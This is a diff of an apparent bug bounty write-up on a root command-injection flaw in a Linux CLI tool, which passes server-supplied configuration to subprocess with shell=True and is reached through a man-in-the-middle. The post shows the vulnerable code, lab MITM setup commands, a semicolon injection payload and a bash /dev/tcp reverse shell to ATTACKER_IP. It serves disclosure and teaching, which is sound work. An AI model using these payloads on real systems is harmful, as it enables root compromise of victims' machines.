@@ -25,67 +25,29 @@ takeaways:
   - "The program's own error message showed me the command it had built. Reading errors slowly is worth more than many payloads."
 ---
 
-This is the second bug I am publishing, and it is one of those that sticks with you: **the
-server literally decides which command your computer runs as root**. No buffer to overflow,
-no exotic architecture to understand. Just one programming decision that millions of
-scripts get wrong every day.
+A Linux command-line tool, part of a desktop application, that runs under `sudo` because it
+has to touch the system's network configuration. When you ask it to connect it asks the
+vendor's server for the parameters, builds a command out of them, and runs it. The whole bug
+lives in that jump.
 
-<div class="warn" markdown="1">
-**Everything is anonymised.** The program authorised publication on condition the product
-is not identifiable. I have changed the vendor, the kind of application, the hosts, class
-and method names and the version numbers. **The mechanism and the bug are exact.**
-</div>
-
-## The target, in one sentence
-
-A **Linux command-line tool** that is part of a desktop application. To work it needs
-administrator privileges, so it runs under `sudo` — documented and normal in its case: it
-has to touch the system's network configuration.
-
-When you ask it to connect, it does this:
-
-1. Asks the vendor's server for the connection parameters.
-2. Uses those parameters to build the command that will launch a system binary.
-3. Runs that command.
-
-Three steps. The bug lives entirely in the jump from 1 to 3.
-
-## The line that changes everything
-
-Reading the tool's code (it shipped packaged, but it can be extracted) I found the point
-where it runs the command:
+## The line
 
 ```python
 # libs/helpers.py
 def execute_command(cmd):
     process = subprocess.Popen(cmd, shell=True)
-    ...
 ```
 
-`subprocess` is how Python runs programs. It can do it two ways, and
-the difference is everything:
-
-- **Without a shell** (`shell=False`): you pass a list — *"run the program `ping`, with the
-  argument `8.8.8.8`"*. Python hands it to the operating system as is. If the argument
-  contains a semicolon, it is a semicolon; one more character of text.
-- **With a shell** (`shell=True`): you pass **a whole sentence** and Python hands it to
-  `/bin/sh` to interpret. And the shell does understand the semicolon: it means *"one
-  command ends here and another begins"*.
-
-The first option treats your data as data. The second treats it as **code**.
-
-See for yourself, it takes ten seconds:
+`shell=True` changes the meaning of everything. Without a shell you pass a list and the
+semicolon is just another character in the argument. With a shell you pass a sentence for
+`/bin/sh` to interpret, and there a semicolon means "one command ends here and another
+begins".
 
 ```python
-import subprocess
+target = "8.8.8.8; touch /tmp/gotcha"
 
-target = "8.8.8.8; touch /tmp/i-got-in"
-
-# safe form: the semicolon is just a character in the argument
-subprocess.run(["ping", "-c1", target])          # ping fails, nothing created
-
-# unsafe form: the shell interprets the semicolon
-subprocess.run(f"ping -c1 {target}", shell=True) # the file appears
+subprocess.run(["ping", "-c1", target])            # ping fails, nothing is created
+subprocess.run(f"ping -c1 {target}", shell=True)   # the file appears
 ```
 
 <figure>
@@ -94,87 +56,59 @@ subprocess.run(f"ping -c1 {target}", shell=True) # the file appears
   <figcaption>The same order down both paths. On the left data stays data; on the right it has become code.</figcaption>
 </figure>
 
-## And what was it putting inside that string?
-
-The usual question: **where do the pieces of the command come from?** I followed the
-construction backwards:
+## What went into that string
 
 ```python
-# the client downloads a block of text with the configuration
 response = requests.get(f"https://api.example.tld/v2/my/servers/{server_id}/configs")
-blob     = response.json()["clientdata"]
+block    = response.json()["clientdata"]
 
-# splits it into lines and words, filtering nothing
-parameters = parse_config(blob)
+params = parse_config(block)        # split by lines and spaces, nothing filtered
 
-# and pastes it into the final command
-cmd = "sudo {} {} {}".format(binary, " ".join(parameters), filters)
-execute_command(cmd)      # <- shell=True
+cmd = "sudo {} {} {}".format(binary, " ".join(params), filters)
+execute_command(cmd)                # <- shell=True
 ```
 
-The program asks the server "tell me how to connect". The server
-answers with text. The program splits that text into pieces and **pastes them into the
-sentence** it is about to run as root. It does not check which options are valid, nor
-whether the values contain dangerous characters. Whatever the server says, runs.
+It does not check which options are valid, nor whether the values carry dangerous
+characters. The server has write access to your command line.
 
-Put another way: **the server has write access to your command line**.
+## "But you have to be the server for that"
 
-## "But for that you have to be the server"
+You have to sit in the middle of that HTTPS connection, yes. And that happens more often
+than it sounds: public wifi with a preinstalled root certificate, corporate laptops with an
+inspection certificate, a compromised intermediate CA, an insider at the network provider.
 
-Exactly, and this is where a lot of people give up. I nearly did too.
-
-For this to fire, the attacker has to answer that HTTPS request: they have to be **in the
-middle** of the connection. That is called a man in the middle (MITM), and it sounds like
-an impossible condition.
-
-It is not that impossible:
-
-- Public wifi with a preinstalled root certificate (hotels, airports, cafés with a captive
-  portal).
-- A company laptop with a corporate certificate installed for traffic inspection. That is
-  utterly normal and exists in almost every large organisation.
-- A compromised intermediate certificate authority — it has happened several times.
-- An insider with access to the network provider.
-
-And the decisive bit: **the bug bounty program itself listed it explicitly in scope**, under
-*"arbitrary code execution by staging MITM attacks"*. If the program contemplates it, it is
-not an excuse not to report: it is a **declared precondition**.
+And the decisive part: the bug bounty program itself listed it in scope, under *"arbitrary
+code execution via MITM attacks"*. If the program contemplates it, it is not an excuse not
+to report: it is a declared precondition.
 
 <div class="note" markdown="1">
-This matters for anyone starting out. Before dismissing a bug because "it needs an unusual
-condition", **read the program's scope**. Many list exactly which preconditions they accept.
-If yours is on that list, your finding counts.
+Before dropping a bug because "it needs an unusual condition", read the scope. Plenty of
+programs list explicitly which preconditions they accept.
 </div>
 
-And what turns the precondition into a product flaw: the client **did not check which
-certificate** it was accepting beyond the system's normal validation. Another part of the
-same product did — it pinned the expected certificate — but this one did not. That
-inconsistency was half the report.
+What makes it the product's bug: the client did not check which certificate it was accepting
+beyond the system's normal validation. Another part of the same product did — it pinned the
+expected certificate — but this one did not. That inconsistency was half the report.
 
-## Building the lab
+## The lab
 
-Everything on a disposable virtual machine, playing both roles: attacker and victim.
+A disposable virtual machine playing both parts.
 
 ```bash
-# 1 · create my own certificate authority and trust it system-wide
+# 1 · my own CA, trusted by the system
 openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
         -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
 sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates
 
-# 2 · issue a certificate for the vendor's domain, signed by my CA
-#     (in a real attack this comes from the wifi, the corporate proxy or the compromised CA)
-
-# 3 · point the domain at my own machine
+# 2 · a certificate for the vendor's domain, signed by it
+# 3 · the domain pointing at my machine
 echo "127.0.0.1  api.example.tld" | sudo tee -a /etc/hosts
 
-# 4 · run a proxy that forwards EVERYTHING to the real server...
-#     ...except the configuration request, which I answer myself
+# 4 · a proxy forwarding everything to the real server except the config request
 ```
 
-I set up a fake server impersonating the vendor's. I forward almost
-everything to the real one so the application notices nothing odd: login works, the server
-list works, everything normal. **I intercept one single request**: the one carrying the
-configuration. That one I answer myself.
+Login works, the server list works, everything normal. I only intercept the request that
+carries the configuration.
 
 <figure>
   <img src="{{ '/assets/img/writeups/rce-cli-shell-true/05-mitm-en.svg' | relative_url }}"
@@ -184,62 +118,40 @@ configuration. That one I answer myself.
 
 ## The payload
 
-The fake server returns the configuration with one poisoned line:
-
 ```
 cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marker; #
 ```
 
-Three pieces, each doing a job:
-
-| Piece | What it is for |
+| Piece | What it does |
 |---|---|
-| `cipher aes-256-gcm` | Looks like a legitimate configuration option. A quick glance sees nothing odd |
-| `; id > /tmp/pwn; touch /tmp/marker` | The **semicolons** close the previous command and open mine |
-| `#` | Comments out whatever the program appends afterwards, so it does not get in the way |
+| `cipher aes-256-gcm` | Looks like a legitimate option; a glance sees nothing odd |
+| `; id > /tmp/pwn; touch /tmp/marker` | The semicolons close the previous command and open mine |
+| `#` | Comments out whatever the program appends afterwards |
 
-The program was going to run `sudo binary --options...`. My text slips
-into the middle, the semicolon cuts the sentence there, my commands run, and the hash makes
-the shell ignore the rest. It is exactly the same as a SQL injection, except the database
-is your operating system.
+It is the same as a SQL injection, except the database is your operating system.
 
 ## Firing it
 
-The victim types the product's normal, documented command. One. The one they would type any
-day.
+The victim types the product's documented command. And something happened that improved the
+report: the binary died because the hash left its order half-written, and on dying **the
+program printed the full sentence it had tried to run, with my payload inside it**. The
+program's failure is the proof of the program's failure.
 
-And then something happened that I did not expect and that improved the report: **the
-program failed and, on failing, printed the command it had built**.
+The commands had already run by then: the shell works left to right. The file was created by
+`uid=0`. And since no connection came up, the user just saw an error and tried again, firing
+the payload a second time.
 
-The system binary died because the hash left its order half-finished. On
-dying, the program printed an error containing the full sentence it had tried to run —
-**with my payload inside, in plain sight**. The program's failure is the proof of the
-program's failure. That is gold for a report: you do not have to convince anyone of what
-happened, the tool shows it.
+## From "I run commands" to "I am in"
 
-And the important bit: the commands **had already run** before the binary died. The shell
-interprets the list from left to right.
-
-That is the proof that counts: **the file was created by `uid=0`**, not by the user. And no
-connection was established, so the user just saw a connection error and tried again —
-firing the payload once more.
-
-## Part two: from "I can run commands" to "I am inside"
-
-A marker in `/tmp` demonstrates the mechanism, but it does not tell a security lead *how
-much* it hurts. So I swapped the payload for a **reverse shell**:
+A marker in `/tmp` proves the mechanism but not how much it hurts. I swapped the payload for
+a reverse shell:
 
 ```
 cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' & id > /tmp/pwn; #
 ```
 
-Instead of creating a file, I tell the victim's computer to open a
-connection **towards me** and hand me a console. From then on I type in my terminal and the
-commands run on their machine, as root. It is not a metaphor: it is their computer, on my
-screen.
-
-Demonstrating the jump from "I can run a command" to "I have a session" is what turns a
-*Medium* into a *High*. Same bug, very different impact in the eyes of whoever triages it.
+From there I type in my terminal and the commands run on their machine, as root. That jump
+is what turns a *Medium* into a *High*.
 
 ## Impact
 
